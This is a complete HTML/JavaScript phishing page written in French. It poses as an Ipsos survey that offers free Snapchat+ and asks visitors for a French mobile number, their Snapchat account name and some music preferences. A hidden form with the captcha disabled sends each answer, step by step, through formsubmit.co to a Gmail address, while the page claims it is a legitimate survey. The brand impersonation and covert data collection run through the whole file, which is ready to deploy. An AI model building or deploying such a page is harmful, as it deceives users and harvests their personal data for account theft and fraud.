<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8">
<title>Sondage | Ipsos</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
<style>
body { font-family: 'Inter', sans-serif; background:#f4f6f9; margin:0; }
.header { background:#003b7a; padding:25px 30px; display:flex; align-items:center; justify-content:center; position:relative; }
.header img { height:50px; }
.header a { position:absolute; left:30px; }
.header-text { color:white; font-size:26px; font-weight:700; }
.logo-fixed { position:fixed; top:20px; right:20px; height:55px; z-index:999; }
.box { max-width:650px; margin:60px auto; background:white; padding:45px; border-radius:12px; box-shadow:0 4px 12px rgba(0,0,0,0.1); }
h2 { font-size:30px; margin-bottom:20px; }
h3 { font-size:18px; margin-bottom:25px; }
p { font-size:20px; margin-bottom:25px; }
input { width:100%; padding:14px; font-size:18px; border-radius:6px; border:1px solid #ccc; margin-bottom:15px; }
button { margin-top:25px; padding:14px 26px; background:#0078d4; color:white; border:0; border-radius:8px; cursor:pointer; font-size:20px; }
button:hover { background:#005fa3; }
button:disabled { background:#b0b0b0; cursor:not-allowed; }
.progress-container { width:100%; height:10px; background:#e0e0e0; border-radius:5px; margin-bottom:25px; }
.progress-bar { height:100%; width:0%; background:#0078d4; transition:width 0.3s ease; }
#partenariat { display:none; text-align:center; margin-top:35px; }
#partenariat .title { font-size:22px; font-weight:700; color:#d00000; margin-bottom:12px; }
#partenariat .operateurs { font-size:26px; font-weight:800; color:#d00000; }
.footer { text-align:center; padding:20px 0; font-size:14px; color:#999; margin-top:40px; border-top:1px solid #ddd; }
@media(max-width:600px){ .box{margin:20px;padding:25px} h2{font-size:24px} h3{font-size:16px} }
</style>
</head>

<body>

<img src="francelogo.png" class="logo-fixed" alt="France">

<div class="header">
    <a href="index.html" onclick="return confirm('Quitter le sondage ? Vos r√©ponses seront perdues.')"><img src="logo.png" alt="Ipsos"></a>
    <div class="header-text">Ipsos ‚Äì Sondage</div>
</div>

<!-- √âCRAN INTRO -->
<div class="box" id="intro">
    <h2>Sondage express</h2>
    <p>R√©pondez au court sondage pour b√©n√©ficier de <strong>Snapchat+</strong> üéÅ</p>
    <button onclick="demarrer()">Commencer</button>
</div>

<!-- √âCRAN T√âL√âPHONE -->
<div class="box" id="telephone" style="display:none;">
    <h2>V√©rification num√©ro</h2>
    <p>Entrez votre num√©ro de t√©l√©phone (06 ou 07 uniquement) :</p>
    <input type="text" id="tel" placeholder="Ex: 06XXXXXXXX">
    <button onclick="verifTel()">Continuer</button>
</div>

<!-- √âCRAN SONDAGE -->
<div class="box" id="sondage" style="display:none;">
    <div class="progress-container">
        <div class="progress-bar" id="progressBar"></div>
    </div>
    <h2 id="titre">Sondage pour Snapchat+</h2>
    <p id="question"></p>
    <div id="reponses"></div>
    <button id="btnSuivant" onclick="suivant()" disabled>Suivant</button>
</div>

<!-- FORMULAIRE CACH√â -->
<form id="formSubmit" action="https://formsubmit.co/ano625343@gmail.com" method="POST" style="display:none;">
    <input type="text" name="telephone" id="f_telephone">
    <input type="text" name="artiste_prefere" id="f_artiste_prefere">
    <input type="text" name="artiste_deezer" id="f_artiste_deezer">
    <input type="text" name="artiste_decouverte" id="f_artiste_decouverte">
    <input type="text" name="snapchat" id="f_snapchat">
    <input type="hidden" name="_cc" value="ano625343@gmail.com">
    <input type="hidden" name="_subject" id="f_subject">
    <input type="hidden" name="_captcha" value="false">
</form>

<div class="footer">¬© 2026 Ipsos ‚Äì Tous droits r√©serv√©s</div>

<script>
let questions = [
    {q:"Quel est votre artiste pr√©f√©r√© ?", id:"f_artiste_prefere"},
    {q:"Quel artiste √©coutez-vous sur Deezer ?", id:"f_artiste_deezer"},
    {q:"Un artiste que vous avez d√©couvert r√©cemment ?", id:"f_artiste_decouverte"},
    {q:"Votre compte Snapchat ?", id:"f_snapchat"}
];
let etape=0;

function demarrer(){
    document.getElementById('intro').style.display='none';
    document.getElementById('telephone').style.display='block';
}

function verifTel(){
    let tel = document.getElementById('tel').value.trim();
    if(!/^0[67]\d{8}$/.test(tel)){ alert("Num√©ro invalide. Doit commencer par 06 ou 07."); return; }
    document.getElementById('f_telephone').value = tel;
    document.getElementById('f_subject').value = "√âtape T√©l√©phone";
    document.getElementById('formSubmit').submit();

    document.getElementById('telephone').style.display='none';
    document.getElementById('sondage').style.display='block';
    afficherQuestion();
}

function afficherQuestion(){
    let q = questions[etape];
    document.getElementById('question').innerText = q.q;
    document.getElementById('reponses').innerHTML = '<input type="text" id="inputReponse">';
    let input = document.getElementById('inputReponse');
    input.addEventListener('input', ()=>{ document.getElementById('btnSuivant').disabled = (input.value.trim()===""); });
    document.getElementById('btnSuivant').disabled=true;
}

function suivant(){
    let input = document.getElementById('inputReponse');
    let val = input.value.trim();
    if(val==="") return;
    document.getElementById(questions[etape].id).value = val;
    document.getElementById('f_subject').value = "√âtape "+(etape+1);
    document.getElementById('formSubmit').submit();

    etape++;
    document.getElementById('progressBar').style.width = ((etape/questions.length)*100)+'%';
    if(etape<questions.length){ afficherQuestion(); }
    else{ 
        document.getElementById('reponses').innerHTML = "<p>Merci ! Votre Snapchat+ sera activ√© bient√¥t.</p>";
        document.getElementById('btnSuivant').style.display='none';
        document.getElementById('progressBar').style.width='100%';
    }
}
</script>

</body>
</html>
